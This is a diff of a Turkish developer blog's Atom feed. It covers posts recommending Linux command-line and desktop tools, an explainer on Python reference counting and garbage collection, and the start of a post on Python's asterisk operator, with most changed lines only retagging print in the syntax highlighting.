+&lt;p&gt;Kendisi seçtiğimiz argümanlara göre bir &lt;code&gt;.gitignore&lt;/code&gt; dosyasını bulunduğunuz dizine bırakıveriyor. Argüman olarak vermeyip uygulama içerisinden seçmeniz gerekiyor bunu belirtmeme gerek yok umarım. Birden fazla argüman alabiliyor.&lt;/p&gt;
+&lt;p&gt;Örnek:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="add-gitignore demo" src="https://raw.githubusercontent.com/TejasQ/add-gitignore/master/demo.gif"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/TejasQ/add-gitignore"&gt;Add-Gitignore Github Linki&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Joplin&lt;/h3&gt;
+&lt;p&gt;Kendisi bir not alma uygulaması ve Dropbox üzerinde çalışıyor bu sayede tüm cihazlarınızda senkronize bir şekilde note alabiliyorsunuz. Benzer ama daha basit ve web üzerinden çalışan bir uygulama için &lt;code&gt;hackmd&lt;/code&gt; 'ye  bakabilirsiniz.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://joplinapp.org/"&gt;Joplin Official Site&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Translate-Shell&lt;/h3&gt;
+&lt;p&gt;Terminal üzerinden Google Translate kullanmanıza yarayan basit ama etkili bir araç. Çok fazla bir açıklama girme gereği duymuyorum.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/soimort/translate-shell"&gt;Translate-Shell Github Linki&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Qucs-s&lt;/h3&gt;
+&lt;p&gt;Kendisi elektronik devre simulasyon uygulaması. Henüz kullanma fırsatım olmadı ama umarım olacaktır. &lt;/p&gt;
+&lt;p&gt;&lt;a href="https://ra3xdh.github.io/"&gt;Qucs-s Official Site&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;fsearch&lt;/h3&gt;
+&lt;p&gt;Kendisi sistem üzerinde hızlıca dosya arayıp bulmamıza olanak sağlayan bir çok özelliği(Örn:Regex) olan bir arama aracı.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/cboxdoerfer/fsearch"&gt;fsearch Github Linki&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Daha önce kullandığım ve yüklediğim uygulamalar/araçlar&lt;/h2&gt;
+&lt;h3&gt;XMind&lt;/h3&gt;
+&lt;p&gt;Kendisi beyin haritalama uygulaması, ben proje geliştirirken bu tür uygulamalar kullanıyorum.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.xmind.net/zen/"&gt;X-Mind Official Site&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Fish Shell&lt;/h3&gt;
+&lt;p&gt;Önceden ne kadar zsh kullansamda artık Fish-shell kullanıyorum. Kendisinin otomatik tamamlama vs gibi özellikleri muazzam.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://fishshell.com/"&gt;Fish-Shell Official Site&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Fisher&lt;/h3&gt;
+&lt;p&gt;Fish-shell için bir paket yöneticisi.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/jorgebucaran/fisher"&gt;Fisher Github Linki&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;HTTPie&lt;/h3&gt;
+&lt;p&gt;Kendisi CLI üzerinden HTTP Client görevini sağlıyor. Tıpkı cURL gibi ama daha insancılı. Gayet başarılı bir uygulama. API'lara vs istek atarken sıkça kullanabilirsiniz. &lt;/p&gt;
+&lt;p&gt;&lt;img alt="httpie demo" src="https://raw.githubusercontent.com/jakubroztocil/httpie/master/httpie.gif"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/jakubroztocil/httpie"&gt;HTTPie Github Linki&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;QuiteRSS&lt;/h3&gt;
+&lt;p&gt;Kendisi bir RSS Feeder. Sevgili &lt;code&gt;Emir&lt;/code&gt;'in tavsiyesi üzerine kullanmaya başladım.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://quiterss.org/"&gt;QuiteRSS Official Site&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;tldr&lt;/h3&gt;
+&lt;p&gt;Kendisini yukarıda bahsetmiş olduğum &lt;code&gt;cheat&lt;/code&gt; aracı ile &lt;code&gt;man&lt;/code&gt; komutunun ortaya karışımı gibi düşünebilirsiniz. Herhangi bir komut hakkında size bilgi ve örnekler gösteriyor. Tl-dr'ı başka nasıl açıklayabilirim bilmiyorum.&lt;/p&gt;
+&lt;p&gt;Örnek bir ekran görüntüsü:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="tldr" src="https://raw.githubusercontent.com/tldr-pages/tldr/master/screenshot.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/tldr-pages/tldr"&gt;TL-DR Github Linki&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;fx&lt;/h3&gt;
+&lt;p&gt;Kendisi bir JSON aracı. Terminal üzerinde Pipe ile verdiğiniz json çıktısı üzerinde gezmenize olanak sağlıyor. Sürekli API, JSON çıktıları ile uğraşıyorsanız işinize yarayacak bir araç olacaktır. Biliyorum bir çok alternatifi var ama ben bunu kullanıyorum. :)&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/antonmedv/fx"&gt;FX Github Linki&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Typora&lt;/h3&gt;
+&lt;p&gt;Geldik bu yazıyı yazdığım editöre. Kendisi bir markdown editor. Yazdığınız anda bulunduğunuz sayfada Markdown'ı render ediyor ve o göz karmaşasından kurtuluyorsunuz. Kendisini severek kullanıyoruz efendim. Basit ve güzel bir arayüz kullanma nedenlerim arasında tabi ki.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://typora.io/"&gt;Typora Official Site&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;DBeaver&lt;/h3&gt;
+&lt;p&gt;Kullanmayan kaldı mı ya bunu? Kendisi bir çok DBMS'e bağlantı kurmanıza olanak sağlayan bir Database yöneticisi. Java ile yazılmış. Sanırım tek sevmediğim tarafı bu. &lt;/p&gt;
+&lt;p&gt;&lt;a href="https://dbeaver.io/"&gt;DBeaver Official Site&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Ascicinema&lt;/h3&gt;
+&lt;p&gt;Kendisini uzun zamandır biliyordum fakat script veya projelerimde hiç kullanmamıştım. Kullanmak nasip oldu. Terminal üzerinde kayıt almanıza ve bu kayıdı paylaşmanıza olanak sağlayan mükemmel bir uygulama. Linkini aşağıda paylaşıyor olacağım. Kullanmak için kayıt olmanız gerekmekte. Kayıt olduktan sonra bir link ile siz olduğunuzu doğruluyorsunuz ve record edip direkt olarak upload edebiliyorsunuz. Kullanımı çok rahat ve pratik. Örnek bir kullanımımı aşağıda görebilirsiniz.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://asciinema.org/a/oRY2H6RUf87aCN2xpNngFQ0iX"&gt;&lt;img alt="Örnek kullanım" src="https://asciinema.org/a/oRY2H6RUf87aCN2xpNngFQ0iX.svg"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://asciinema.org/"&gt;Asciicinema&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Aslında kurmuş, bulmuş olduğum transfer.sh adlı bir uygulama daha mevcut fakat sanırım sistemlerde bir problem var ve çalışmıyor. İlgili tool terminal üzerinden dosya paylaşmanıza olanak sağlayan bir uygulama. &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Geldik yazının sonuna. Bundan sonraki yazım muhtelemelen güvenlik araçları ile ilgili olacaktır.&lt;/p&gt;
+&lt;p&gt;Benim için bir gelenek olan yazı sonu şarkımı aşağıya iliştiriyorum. &lt;/p&gt;
+&lt;p&gt;Oldukça sert ve protest olarak nitelendirdiğim bu şarkıyı umarım keyifle dinlersiniz :)&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=J-KUtPPlUqs" title="saian &amp;lt;3"&gt;&lt;img alt="Saian K&amp;quot;st Uçurum Çiçeği" src="http://img.youtube.com/vi/J-KUtPPlUqs/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="linux"></category><category term="linux kurulum sonrası"></category><category term="linux tavsiye uygulamalar"></category><category term="yazılımcılar için linux"></category><category term="en güzel linux uygualamaları"></category></entry><entry><title>Python Hafıza Yönetimi ve Garbage Collection Hakkında</title><link href="https://enesergun.net/python-garbage-collection.html" rel="alternate"></link><published>2019-03-06T13:30:00+03:00</published><updated>2019-03-06T13:30:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2019-03-06:/python-garbage-collection.html</id><summary type="html">&lt;h1&gt;Python Garbage Collector&lt;/h1&gt;
 &lt;h2&gt;Garbage Collector Neymiş?&lt;/h2&gt;
 &lt;p&gt;Garbage collector Türkçe'ye çevrildiğinde çöp toplayıcı anlamına gelmektedir. Aslında yazılım dillerindeki temel mantığıda aynıdır. Nedir bu olay derseniz de basit anlamda kodunuz üzerinde kullandığınız her nesne/obje memory'de bir alan kaplar. Bu alan verinizin boyutuna göredir. Örnek vermek gerekirse C'de 32bit bir integer değişkeni …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Python Garbage Collector&lt;/h1&gt;
 &lt;h2&gt;Garbage Collector Neymiş?&lt;/h2&gt;
@@ -18,12 +244,12 @@
 3. Cyclical Reference'ları tanımlayamıyor. 
 Örnek:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrefcount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrefcount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;
 &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrefcount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrefcount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;span class="k"&gt;del&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrefcount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrefcount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;span class="n"&gt;Output&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
 &lt;span class="mi"&gt;69&lt;/span&gt;
 &lt;span class="mi"&gt;71&lt;/span&gt;
@@ -70,8 +296,8 @@ Yeni birisiyle tanıştınız. Beyninizde bu tanıştığınız kişi &lt;code&g
 &lt;p&gt;Kod olarak açıklarsak eğer:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;500&lt;/span&gt;
 &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;500&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; 
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; 
 &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
 &lt;span class="mi"&gt;49670448&lt;/span&gt;
 &lt;span class="mi"&gt;49670448&lt;/span&gt; &lt;span class="mi"&gt;49670448&lt;/span&gt;
@@ -80,14 +306,14 @@ Yeni birisiyle tanıştınız. Beyninizde bu tanıştığınız kişi &lt;code&g
 
 &lt;p&gt;Gördüğünüz gibi iki farklı değişkenim, hatta bir integer'ım var ve aslında hepsi temelde memorydeki 500 değerini barındıran PyObject'e referans veriyor. Bir de aşağıdaki koda bakalım.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrefcount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrefcount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;500&lt;/span&gt;
 &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;500&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrefcount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrefcount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrefcount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrefcount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -105,7 +331,7 @@ Yeni birisiyle tanıştınız. Beyninizde bu tanıştığınız kişi &lt;code&g
 &lt;p&gt;&lt;a href="https://medium.com/@mazlumagar/python-tricks-1-slots-e0c9b04f4c5a"&gt;Python Tricks &lt;strong&gt;Slots&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Konu biraz dağınık olmuş olabilir bu sebeple kusura bakmayınız. Yazı tamamen benim de bilmediğim konu üzerine yaptığım araştırmalar neticesinde çıkmıştır. Eğer bir yanlışımı görürseniz kesinlikle ve kesinlikle beni uyarabilirsiniz. &lt;/p&gt;
 &lt;p&gt;Geleneksel hale getirdiğim yazı sonu şarkısını aşağıya ekliyorum, bilimle kalın.&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=OYHsJ_h-noc"&gt;&lt;img alt="Gökşin Derin- Depresyon" src="https://img.youtube.com/vi/OYHsJ_h-noc/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="python memory management"></category><category term="python hafıza yönetim"></category><category term="python yavaş"></category><category term="python çöp toplayıcı"></category><category term="garbage collection types"></category></entry><entry><title>Python'da "*" Karakteri Nerede ve Nasıl Kullanılır</title><link href="https://enesergun.net/python-asterisk-nerede-ve-nasil.html" rel="alternate"></link><published>2019-01-24T18:50:00+03:00</published><updated>2019-01-24T18:50:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2019-01-24:/python-asterisk-nerede-ve-nasil.html</id><summary type="html">&lt;p&gt;Merhabalar,&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=OYHsJ_h-noc"&gt;&lt;img alt="Gökşin Derin- Depresyon" src="https://img.youtube.com/vi/OYHsJ_h-noc/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="python"></category><category term="python memory management"></category><category term="python hafıza yönetim"></category><category term="python yavaş"></category><category term="python çöp toplayıcı"></category><category term="garbage collection types"></category></entry><entry><title>Python'da "*" Karakteri Nerede ve Nasıl Kullanılır</title><link href="https://enesergun.net/python-asterisk-nerede-ve-nasil.html" rel="alternate"></link><published>2019-01-24T18:50:00+03:00</published><updated>2019-01-24T18:50:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2019-01-24:/python-asterisk-nerede-ve-nasil.html</id><summary type="html">&lt;p&gt;Merhabalar,&lt;/p&gt;
 &lt;p&gt;Vardiyalı çalıştığımdan dolayı bu ay nasıl olduysa 5 gün ard arda iznim olmuş. Bu tatili çok verimli geçirmek istediğimden dolayı çalışacağım konulara çalışmaya, yazacağım kodları yazmaya, bloguma özen vermeye çalıştım. Tabi burada oyun oynamaktan da vazgeçmedim :)&lt;/p&gt;
 &lt;p&gt;İşte bu sebeple bu isteklerimin 3.cüsü olan bloguma özen vermeye çalışmanın bir …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Merhabalar,&lt;/p&gt;
 &lt;p&gt;Vardiyalı çalıştığımdan dolayı bu ay nasıl olduysa 5 gün ard arda iznim olmuş. Bu tatili çok verimli geçirmek istediğimden dolayı çalışacağım konulara çalışmaya, yazacağım kodları yazmaya, bloguma özen vermeye çalıştım. Tabi burada oyun oynamaktan da vazgeçmedim :)&lt;/p&gt;
@@ -134,10 +360,10 @@ Yeni birisiyle tanıştınız. Beyninizde bu tanıştığınız kişi &lt;code&g
 
 &lt;p&gt;Yukarıdaki örnekte  farketmiş olacağınız üzere "çarpma" örneğininde bize içinde ki karakterleri değil değişkene tanımlamış olduğumuz değeri 2 ile çarpacaktır. &lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;enes&amp;quot;&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;enesenes&lt;/span&gt;
 &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -151,16 +377,16 @@ Yeni birisiyle tanıştınız. Beyninizde bu tanıştığınız kişi &lt;code&g
 &lt;p&gt;&lt;strong&gt;Örnek 1 &lt;/strong&gt;&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;isimler&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Enes&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Yasin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Emir&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Basri&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Mustafa&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 &lt;span class="c1"&gt;# Burada isimleri yazdırabilmek için string&amp;#39;e çevirip yazdırabiliriz pek tabii fakat konumuz &amp;quot;*&amp;quot; ve bu yolun pekte efektif olduğu söylenemez.&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;isimler&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#Unpacking &lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;isimler&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c1"&gt;# List to str&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;isimler&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#Unpacking &lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;isimler&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c1"&gt;# List to str&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Yukarıdaki örnekte eğer bir listeyi yazdıracaksak bize cidden büyük bir kolaylık sağlıyor. Şimdi diğer örneklerle ve açıklamalarıyla birlikte devam edelim.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Örnek 2&lt;/strong&gt;&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;yazdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
